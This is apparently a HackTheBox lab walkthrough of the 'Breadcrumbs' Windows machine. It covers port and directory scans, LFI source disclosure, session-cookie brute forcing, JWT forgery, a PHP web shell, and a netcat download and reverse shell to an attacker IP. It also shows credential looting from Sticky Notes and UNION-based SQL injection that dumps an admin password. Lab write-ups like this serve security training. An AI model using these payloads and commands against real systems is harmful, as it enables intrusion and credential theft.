Enumeration nmap └─$ nmap -Pn -p- 10.10.10.228 --min-rate 5000 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:47 BST Warning: 10.10.10.228 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.10.228 (10.10.10.228) Host is up (0.096s latency). Not shown: 62260 filtered tcp ports (no-response), 3270 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 5040/tcp open unknown └─$ nmap -Pn -p22,80,135,139,443,445,3306,5040 -sC -sV 10.10.10.228 --min-rate 5000 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:59 BST Nmap scan report for 10.10.10.228 (10.10.10.228) Host is up (0.15s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA) | 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA) |_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519) 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 |_http-title: Library 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_http-title: Library | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set 445/tcp open microsoft-ds? 3306/tcp open mysql? | fingerprint-strings: | NULL, WMSRequest: |_ Host \u0026#39;10.10.16.9\u0026#39; is not allowed to connect to this MariaDB server 5040/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.94%I=7%D=9/17%Time=65074C9C%P=x86_64-pc-linux-gnu%r(NU SF:LL,49,\u0026#34;E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.9\u0026#39;\\x20is\\x20not\\x20allowe SF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(WMSRequest,49 SF:,\u0026#34;E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.9\u0026#39;\\x20is\\x20not\\x20allowed\\x20 SF:to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -39s | smb2-time: | date: 2023-09-17T19:01:46 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Port 80, 443 gobuster └─$ gobuster dir -u https://10.10.10.228/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.10.228/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/09/17 20:13:14 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 2368] /books (Status: 301) [Size: 338] [--\u0026gt; https://10.10.10.228/books/] /php (Status: 301) [Size: 336] [--\u0026gt; https://10.10.10.228/php/] /portal (Status: 301) [Size: 339] [--\u0026gt; https://10.10.10.228/portal/] /css (Status: 301) [Size: 336] [--\u0026gt; https://10.10.10.228/css/] /includes (Status: 301) [Size: 341] [--\u0026gt; https://10.10.10.228/includes/] /Index.php (Status: 200) [Size: 2368] /db (Status: 301) [Size: 335] [--\u0026gt; https://10.10.10.228/db/] /js (Status: 301) [Size: 335] [--\u0026gt; https://10.10.10.228/js/] /Books (Status: 301) [Size: 338] [--\u0026gt; https://10.10.10.228/Books/] /examples (Status: 503) [Size: 402] /licenses (Status: 403) [Size: 421] /PHP (Status: 301) [Size: 336] [--\u0026gt; https://10.10.10.228/PHP/] /%20 (Status: 403) [Size: 302] /INDEX.php (Status: 200) [Size: 2368] /Portal (Status: 301) [Size: 339] [--\u0026gt; https://10.10.10.228/Portal/] /*checkout*.txt (Status: 403) [Size: 302] /*checkout* (Status: 403) [Size: 302] /*checkout*.php (Status: 403) [Size: 302] /CSS (Status: 301) [Size: 336] [--\u0026gt; https://10.10.10.228/CSS/] /JS (Status: 301) [Size: 335] [--\u0026gt; https://10.10.10.228/JS/] /phpmyadmin (Status: 403) [Size: 302] /webalizer (Status: 403) [Size: 302] /*docroot*.txt (Status: 403) [Size: 302] /*docroot* (Status: 403) [Size: 302] /*docroot*.php (Status: 403) [Size: 302] /DB (Status: 301) [Size: 335] [--\u0026gt; https://10.10.10.228/DB/] /*.php (Status: 403) [Size: 302] /*.txt (Status: 403) [Size: 302] /* (Status: 403) [Size: 302] /con.php (Status: 403) [Size: 302] /con.txt (Status: 403) [Size: 302] /con (Status: 403) [Size: 302] feroxbuster └─$ feroxbuster -u http://10.10.10.228 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.228 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 404 GET 9l 33w 298c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 403 GET 9l 30w 301c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 301 GET 9l 30w 334c http://10.10.10.228/css =\u0026gt; http://10.10.10.228/css/ 301 GET 9l 30w 333c http://10.10.10.228/js =\u0026gt; http://10.10.10.228/js/ 301 GET 9l 30w 339c http://10.10.10.228/includes =\u0026gt; http://10.10.10.228/includes/ 200 GET 0l 0w 0c http://10.10.10.228/js/main.js 200 GET 66l 80w 853c http://10.10.10.228/css/main.css 200 GET 89l 221w 4727c http://10.10.10.228/php/books.php 200 GET 5l 13w 196c http://10.10.10.228/includes/footer.php 301 GET 9l 30w 333c http://10.10.10.228/db =\u0026gt; http://10.10.10.228/db/ 200 GET 68l 146w 1937c http://10.10.10.228/js/books.js 200 GET 0l 0w 0c http://10.10.10.228/includes/bookController.php 301 GET 9l 30w 334c http://10.10.10.228/php =\u0026gt; http://10.10.10.228/php/ 200 GET 4586l 7794w 73117c http://10.10.10.228/css/all.css 200 GET 45l 118w 2368c http://10.10.10.228/ 200 GET 0l 0w 0c http://10.10.10.228/db/db.php 301 GET 9l 30w 337c http://10.10.10.228/portal =\u0026gt; http://10.10.10.228/portal/ 301 GET 9l 30w 336c http://10.10.10.228/books =\u0026gt; http://10.10.10.228/books/ 301 GET 9l 30w 346c http://10.10.10.228/portal/includes =\u0026gt; http://10.10.10.228/portal/includes/ 301 GET 9l 30w 345c http://10.10.10.228/portal/uploads =\u0026gt; http://10.10.10.228/portal/uploads/ 200 GET 5l 13w 196c http://10.10.10.228/portal/includes/footer.php 200 GET 4l 49w 375c http://10.10.10.228/books/book9.html 200 GET 4l 62w 400c http://10.10.10.228/books/book7.html 200 GET 4l 67w 468c http://10.10.10.228/books/book12.html 200 GET 4l 61w 379c http://10.10.10.228/books/book3.html 200 GET 4l 58w 446c http://10.10.10.228/books/book10.html 200 GET 4l 63w 435c http://10.10.10.228/books/book11.html 200 GET 4l 62w 431c http://10.10.10.228/books/book8.html 301 GET 9l 30w 344c http://10.10.10.228/portal/assets =\u0026gt; http://10.10.10.228/portal/assets/ 200 GET 4l 64w 465c http://10.10.10.228/books/book14.html 301 GET 9l 30w 340c http://10.10.10.228/portal/db =\u0026gt; http://10.10.10.228/portal/db/ 200 GET 0l 0w 0c http://10.10.10.228/portal/includes/usersController.php 200 GET 0l 0w 0c http://10.10.10.228/portal/includes/fileController.php 200 GET 0l 0w 0c http://10.10.10.228/portal/includes/issuesController.php 301 GET 9l 30w 341c http://10.10.10.228/portal/php =\u0026gt; http://10.10.10.228/portal/php/ 200 GET 0l 0w 0c http://10.10.10.228/portal/db/db.php 200 GET 82l 189w 4395c http://10.10.10.228/portal/php/admins.php 302 GET 0l 0w 0c http://10.10.10.228/portal/php/issues.php =\u0026gt; ../auth/login.php 302 GET 2l 13w 148c http://10.10.10.228/portal/php/files.php =\u0026gt; ../auth/login.php 302 GET 0l 0w 0c http://10.10.10.228/portal/php/users.php =\u0026gt; ../auth/login.php 200 GET 66l 80w 853c http://10.10.10.228/portal/assets/css/main.css 200 GET 12l 23w 192c http://10.10.10.228/portal/assets/css/style.css 200 GET 0l 0w 0c http://10.10.10.228/portal/assets/js/main.js 200 GET 23l 38w 585c http://10.10.10.228/portal/assets/js/files.js 200 GET 53l 299w 24708c http://10.10.10.228/portal/assets/webfonts/fa-regular-400.woff2 200 GET 4586l 7794w 73117c http://10.10.10.228/portal/assets/css/all.css 200 GET 273l 1751w 140313c http://10.10.10.228/portal/assets/webfonts/fa-brands-400.woff2 503 GET 11l 44w 401c http://10.10.10.228/examples 200 GET 2920l 15147w 235832c http://10.10.10.228/portal/assets/webfonts/fa-solid-900.eot 200 GET 376l 2014w 164046c http://10.10.10.228/portal/assets/webfonts/fa-brands-400.woff 200 GET 349l 2161w 189029c http://10.10.10.228/portal/assets/webfonts/fa-solid-900.woff 200 GET 1839l 7533w 149215c http://10.10.10.228/portal/assets/webfonts/fa-brands-400.ttf 200 GET 1839l 7547w 149529c http://10.10.10.228/portal/assets/webfonts/fa-brands-400.eot 200 GET 3637l 76781w 730302c http://10.10.10.228/portal/assets/webfonts/fa-brands-400.svg 200 GET 2919l 15134w 235536c http://10.10.10.228/portal/assets/webfonts/fa-solid-900.ttf 301 GET 9l 30w 344c http://10.10.10.228/portal/vendor =\u0026gt; http://10.10.10.228/portal/vendor/ 200 GET 379l 1897w 40385c http://10.10.10.228/portal/assets/webfonts/fa-regular-400.eot 200 GET 70l 366w 30184c http://10.10.10.228/portal/assets/webfonts/fa-regular-400.woff 200 GET 379l 1885w 40081c http://10.10.10.228/portal/assets/webfonts/fa-regular-400.ttf 200 GET 336l 1782w 145509c http://10.10.10.228/portal/assets/webfonts/fa-solid-900.woff2 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/autoload.php 200 GET 805l 17194w 144715c http://10.10.10.228/portal/assets/webfonts/fa-regular-400.svg 200 GET 164l 307w 6074c http://10.10.10.228/portal/vendor/composer/installed.json 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/composer/installed.php 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/composer/ClassLoader.php 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/composer/platform_check.php 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/composer/autoload_static.php 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/composer/autoload_real.php 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/composer/InstalledVersions.php 200 GET 21l 168w 1070c http://10.10.10.228/portal/vendor/composer/LICENSE 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/composer/autoload_namespaces.php 200 GET 5015l 105316w 914125c http://10.10.10.228/portal/assets/webfonts/fa-solid-900.svg 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/composer/autoload_classmap.php 200 GET 0l 0w 0c http://10.10.10.228/portal/vendor/composer/autoload_psr4.php 403 GET 11l 47w 420c http://10.10.10.228/licenses 403 GET 11l 47w 420c http://10.10.10.228/server-status Foothold db endpoint has db.php file But I can\u0026rsquo;t open it We also have portal endpoint Clicking helper shows us admins Potential usernames Let\u0026rsquo;s register a user We have issues on /portal/pip/issues.php We have users on /portal/php/users.php When we click order pizza we have an popup message File management is redirected to index.php Burp returns code 302 Found and redirect to ../index.php Let\u0026rsquo;s change to 200 OK and we receive the page But we can\u0026rsquo;t upload anything Controllers responsible for portal endpoint In issues we saw the task to store the books in database We also saw the books in feroxbuster Let\u0026rsquo;s navigate to http://10.10.10.228/php/books.php Look for existing book For example Adventures of Tom Sawyer http://10.10.10.228/books/book3.html Check the requests in Burp We a potential LFI in /includes/bookController.php via book parameter Let\u0026rsquo;s try getting index.php Looks like it\u0026rsquo;s working Now we need to go through source code Eventually we will find interesting authController.php in /portal/login.php In authController.php we see a secret key for signing jwt token We also have creds in db/db.php \u0026lt;?php $host=\u0026#34;localhost\u0026#34;; $port=3306; $user=\u0026#34;bread\u0026#34;; $password=\u0026#34;jUli901\u0026#34;; $dbname=\u0026#34;bread\u0026#34;; $con = new mysqli($host, $user, $password, $dbname, $port) or die (\u0026#39;Could not connect to the database server\u0026#39; . mysqli_connect_error()); ?\u0026gt; We need to craft PHPSESSID makesession is defined in cookies.php And jwt ... if($valid){ session_id(makesession($username)); session_start(); $secret_key = \u0026#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e\u0026#39;; $data = array(); $payload = array( \u0026#34;data\u0026#34; =\u0026gt; array( \u0026#34;username\u0026#34; =\u0026gt; $username )); $jwt = JWT::encode($payload, $secret_key, \u0026#39;HS256\u0026#39;); setcookie(\u0026#34;token\u0026#34;, $jwt, time() + (86400 * 30), \u0026#34;/\u0026#34;); $_SESSION[\u0026#39;username\u0026#39;] = $username; $_SESSION[\u0026#39;loggedIn\u0026#39;] = true; if($userdata[0][\u0026#39;position\u0026#39;] == \u0026#34;\u0026#34;){ $_SESSION[\u0026#39;role\u0026#39;] = \u0026#34;Awaiting approval\u0026#34;; } else{ $_SESSION[\u0026#39;role\u0026#39;] = $userdata[0][\u0026#39;position\u0026#39;]; } header(\u0026#34;Location: /portal\u0026#34;); ... ... function makesession($username){ $max = strlen($username) - 1; $seed = rand(0, $max); $key = \u0026#34;s4lTy_stR1nG_\u0026#34;.$username[$seed].\u0026#34;(!528.\\/9890\u0026#34;; $session_cookie = $username.md5($key); return $session_cookie; Let\u0026rsquo;s write a script to find a valid sookie import hashlib import requests users = [\u0026#34;alex\u0026#34;, \u0026#34;paul\u0026#34;, \u0026#34;jack\u0026#34;, \u0026#34;olivia\u0026#34;, \u0026#34;john\u0026#34;, \u0026#34;emma\u0026#34;, \u0026#34;william\u0026#34;, \u0026#34;lucas\u0026#34;, \u0026#34;sirine\u0026#34;, \u0026#34;juliette\u0026#34;, \u0026#34;support\u0026#34;] for user in users: for ch in user: hash = hashlib.md5(f\u0026#34;s4lTy_stR1nG_{ch}(!528./9890\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() cookie = f\u0026#34;{user}{hash}\u0026#34;\tr = requests.get(\u0026#39;http://10.10.10.228/portal/index.php\u0026#39;, cookies={\u0026#34;PHPSESSID\u0026#34;: cookie}) if user in r.text.lower(): print(f\u0026#34;Found =\u0026gt; {user}: {cookie}\u0026#34;) We have hits └─$ python3 cookie_check.py Found =\u0026gt; paul: paul47200b180ccd6835d25d034eeb6e6390 Found =\u0026gt; olivia: oliviaaa0aa8b0e94759562a5854d69b9e6b79 Found =\u0026gt; john: john5815c66675415230039fb4616cd0dce8 I\u0026rsquo;ll use paul\u0026rsquo;s cookie, since he\u0026rsquo;s an admin If we try to upload, we will still have insufficient privileges error We need to forge jwt token We know the secret Let\u0026rsquo;s use jwt.io The payload is based on source code we got above Now we can upload files I tried uploading a simple webshell, but received an error Burp shows that the web page is trying appending .zip to task name I changed the Test.zip to shell.php But now we got different error I was stuck here for a while I saw some hints on forum, it looks like windows defender is flagging my php file as malicious Let\u0026rsquo;s change it a bit \u0026lt;?php $result=shell_exec($_REQUEST['cmd']); echo \u0026quot;\u0026lt;pre\u0026gt;$result\u0026lt;/pre\u0026gt;\u0026quot;; ?\u0026gt; Let\u0026rsquo;s get reverse shell └─$ curl http://10.10.10.228/portal/uploads/shell.php --data-urlencode \u0026#34;cmd=powershell -c wget 10.10.16.8/nc64.exe -outfile C:\\programdata\\nc.exe\u0026#34; \u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt; └─$ curl http://10.10.10.228/portal/uploads/shell.php --data-urlencode \u0026#34;cmd=\\programdata\\nc.exe 10.10.16.8 6666 -e cmd\u0026#34; User Enumerate Inside C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal we have pizzaDeliveryUserData folder It looks like it\u0026rsquo;s related to disabled button in portal endpoint We found creds in juliette.json file C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\pizzaDeliveryUserData\u0026gt;type juliette.json type juliette.json { \u0026#34;pizza\u0026#34; : \u0026#34;margherita\u0026#34;, \u0026#34;size\u0026#34; : \u0026#34;large\u0026#34;, \u0026#34;drink\u0026#34; : \u0026#34;water\u0026#34;, \u0026#34;card\u0026#34; : \u0026#34;VISA\u0026#34;, \u0026#34;PIN\u0026#34; : \u0026#34;9890\u0026#34;, \u0026#34;alternate\u0026#34; : { \u0026#34;username\u0026#34; : \u0026#34;juliette\u0026#34;, \u0026#34;password\u0026#34; : \u0026#34;jUli901./())!\u0026#34;, } } Let\u0026rsquo;s try ssh juliette:jUli901./())! └─$ ssh juliette@10.10.10.228 The authenticity of host \u0026#39;10.10.10.228 (10.10.10.228)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:aQcQrF+10YxX8CBQ26nT/5luebgQc123pC6ciqCe4J0. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.10.228\u0026#39; (ED25519) to the list of known hosts. juliette@10.10.10.228\u0026#39;s password: Microsoft Windows [Version 10.0.19041.746] (c) 2020 Microsoft Corporation. All rights reserved. juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt; Root We have a note on juliette\u0026rsquo;s desktop juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt;dir desktop Volume in drive C has no label. Volume Serial Number is 7C07-CD3A Directory of C:\\Users\\juliette\\desktop 01/15/2021 05:04 PM \u0026lt;DIR\u0026gt; . 01/15/2021 05:04 PM \u0026lt;DIR\u0026gt; .. 12/09/2020 07:27 AM 753 todo.html 09/21/2023 10:10 AM 34 user.txt 2 File(s) 787 bytes 2 Dir(s) 5,491,372,032 bytes free juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt;type desktop\\todo.html \u0026lt;html\u0026gt; \u0026lt;style\u0026gt; html{ background:black; color:orange; } table,th,td{ border:1px solid orange; padding:1em; border-collapse:collapse; } \u0026lt;/style\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;Task\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;Status\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;Reason\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Configure firewall for port 22 and 445\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Not started\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Unauthorized access might be possible\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;In progress\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;It stores passwords in plain text\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Add new features to password manager\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Not started\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;To get promoted, hopefully lol\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/html\u0026gt; We can google info about Sticky Notes https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#sticky-notes juliette@BREADCRUMBS C:\\\u0026gt;dir c:\\users\\juliette\\Appdata\\local\\packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\ Volume in drive C has no label. Volume Serial Number is 7C07-CD3A Directory of c:\\users\\juliette\\Appdata\\local\\packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState 01/15/2021 05:10 PM \u0026lt;DIR\u0026gt; . 01/15/2021 05:10 PM \u0026lt;DIR\u0026gt; .. 01/15/2021 05:10 PM 20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session 11/29/2020 04:10 AM 4,096 plum.sqlite 01/15/2021 05:10 PM 32,768 plum.sqlite-shm 01/15/2021 05:10 PM 329,632 plum.sqlite-wal 4 File(s) 386,976 bytes 2 Dir(s) 5,491,294,208 bytes free I downloaded files Host smbserver impacket-smbserver share $(pwd) -smb2support PS C:\\users\\juliette\\Appdata\\local\\packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\u0026gt; copy plum.* \\\\10.10.16.8\\share\\ └─$ ls plum.sqlite plum.sqlite-shm plum.sqlite-wal Let\u0026rsquo;s open them using sqlite3 └─$ sqlite3 plum.sqlite SQLite version 3.42.0 2023-05-16 12:36:15 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .tables Media Stroke SyncState User Note StrokeMetadata UpgradedNote sqlite\u0026gt; select * from Note; \\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())! \\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g \\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122 We have creds for development We saw Development folder in C:\\ that we couldn\u0026rsquo;t access I am pretty sure development user has access to it PS C:\\\u0026gt; icacls c:\\development c:\\development NT AUTHORITY\\SYSTEM:(OI)(CI)(RX) BUILTIN\\Administrators:(OI)(CI)(RX) BREADCRUMBS\\development:(OI)(CI)(RX) Successfully processed 1 files; Failed processing 0 files └─$ smbmap -H 10.10.10.228 -u development -p \u0026#39;fN3)sN5Ee@g\u0026#39; [+] IP: 10.10.10.228:445 Name: 10.10.10.228 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Anouncements READ ONLY C$ NO ACCESS Default share Development READ ONLY IPC$ READ ONLY Remote IPC Let\u0026rsquo;s check it └─$ smbclient //10.10.10.228/development -U \u0026#39;development%fN3)sN5Ee@g\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Jan 16 00:03:49 2021 .. D 0 Sat Jan 16 00:03:49 2021 Krypter_Linux A 18312 Sun Nov 29 11:11:56 2020 5082961 blocks of size 4096. 1340573 blocks available smb: \\\u0026gt; get Krypter_Linux getting file \\Krypter_Linux of size 18312 as Krypter_Linux (22.9 KiloBytes/sec) (average 22.9 KiloBytes/sec) Krypter_Linux └─$ file Krypter_Linux Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped └─$ ./Krypter_Linux Krypter V1.2 New project by Juliette. New features added weekly! What to expect next update: - Windows version with GUI support - Get password from cloud and AUTOMATICALLY decrypt! *** No key supplied. USAGE: Krypter \u0026lt;key\u0026gt; I\u0026rsquo;ll open the file in Ghidra We can see that there is curl request to http://passmanager.htb:1234/index.php Let\u0026rsquo;s reconnect with ssh and set port forwarding with -L 1234:127.0.01:1234 ssh -L 1234:127.0.0.1:1234 juliette@10.10.10.228 └─$ curl \u0026#39;http://127.0.0.1:1234/index.php?method=select\u0026amp;username=administrator\u0026amp;table=passwords\u0026#39; selectarray(1) { [0]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(16) \u0026#34;k19D193j.\u0026lt;19391(\u0026#34; } } Or juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt;curl \u0026#34;http://127.0.0.1:1234/index.php?method=select\u0026amp;username=administrator\u0026amp;table=passwords\u0026#34; selectarray(1) { [0]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(16) \u0026#34;k19D193j.\u0026lt;19391(\u0026#34; } } We have a key, but we also need an encrypted password It looks like it\u0026rsquo;s SQL query We can try SQL Injection Simple payload: username=' or 1=1;-- - └─$ curl \u0026#34;http://127.0.0.1:1234/index.php\u0026#34; -d \u0026#34;method=select\u0026amp;username=\u0026#39; or 1=1;-- -\u0026amp;table=passwords\u0026#34; selectarray(1) { [0]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(16) \u0026#34;k19D193j.\u0026lt;19391(\u0026#34; } } So it\u0026rsquo;s vulnerable Let\u0026rsquo;s enumerate Single column └─$ curl \u0026#34;http://127.0.0.1:1234/index.php\u0026#34; -d \u0026#34;method=select\u0026amp;username=\u0026#39; UNION select 1;-- -\u0026amp;table=passwords\u0026#34; selectarray(1) { [0]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(1) \u0026#34;1\u0026#34; } } └─$ curl \u0026#34;http://127.0.0.1:1234/index.php\u0026#34; -d \u0026#34;method=select\u0026amp;username=\u0026#39; UNION select 1,2;-- -\u0026amp;table=passwords\u0026#34; select\u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Fatal error\u0026lt;/b\u0026gt;: Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type mysqli_result, bool given in C:\\Users\\Administrator\\Desktop\\passwordManager\\htdocs\\index.php:18 Stack trace: #0 C:\\Users\\Administrator\\Desktop\\passwordManager\\htdocs\\index.php(18): mysqli_fetch_all(false, 1) #1 {main} thrown in \u0026lt;b\u0026gt;C:\\Users\\Administrator\\Desktop\\passwordManager\\htdocs\\index.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;18\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; Check the database └─$ curl \u0026#34;http://127.0.0.1:1234/index.php\u0026#34; -d \u0026#34;method=select\u0026amp;username=\u0026#39; UNION select database();-- -\u0026amp;table=passwords\u0026#34; selectarray(1) { [0]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(5) \u0026#34;bread\u0026#34; } } └─$ curl \u0026#34;http://127.0.0.1:1234/index.php\u0026#34; -d \u0026#34;method=select\u0026amp;username=\u0026#39; UNION select table_name from information_schema.tables where table_schema=\u0026#39;bread\u0026#39;;-- -\u0026amp;table=passwords\u0026#34; selectarray(1) { [0]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(9) \u0026#34;passwords\u0026#34; } } └─$ curl \u0026#34;http://127.0.0.1:1234/index.php\u0026#34; -d \u0026#34;method=select\u0026amp;username=\u0026#39; UNION select column_name from information_schema.columns where table_name=\u0026#39;passwords\u0026#39;;-- -\u0026amp;table=passwords\u0026#34; selectarray(4) { [0]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(2) \u0026#34;id\u0026#34; } [1]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(7) \u0026#34;account\u0026#34; } [2]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(8) \u0026#34;password\u0026#34; } [3]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(7) \u0026#34;aes_key\u0026#34; } } Let\u0026rsquo;s dump the table └─$ curl \u0026#34;http://127.0.0.1:1234/index.php\u0026#34; -d \u0026#34;method=select\u0026amp;username=\u0026#39; UNION select concat_ws(\u0026#39;, \u0026#39;,id,account,password,aes_key) from passwords;-- -\u0026amp;table=passwords\u0026#34; selectarray(1) { [0]=\u0026gt; array(1) { [\u0026#34;aes_key\u0026#34;]=\u0026gt; string(80) \u0026#34;1, Administrator, H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=, k19D193j.\u0026lt;19391(\u0026#34; } } Now we need to decrypt Administrator:p@ssw0rd!@#$9890./ Now we can ssh ","date":"September 17, 2023","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/breadcrumbs/","summary":"Breadcrumps Enumeration nmap └─$ nmap -Pn -p- 10.10.10.228 --min-rate 5000 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 